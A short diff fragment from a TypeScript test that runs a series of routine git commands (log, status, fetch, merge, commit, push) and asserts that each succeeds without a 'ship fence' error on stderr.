+			for (const args of [["log", "-1", "--oneline"], ["show", "HEAD", "--stat"], ["diff", "--stat"], ["blame", "src/a.ts"], ["status", "-s"], ["fetch", "origin"], ["merge", "--no-edit", "origin/main"], ["commit", "--allow-empty", "-m", "x"], ["push", "origin", BRANCH]]) {
+				const r = git(process.env, ...args);
+				expect(r.stderr, args.join(" ")).not.toContain("ship fence");
+				expect(r.status, `${args.join(" ")}: ${r.stderr}`).toBe(0);
+			}
 			expect(originHas(BRANCH)).toBe(sh(repo, "rev-parse", "HEAD").trim());
 		}, 30_000);
 	});
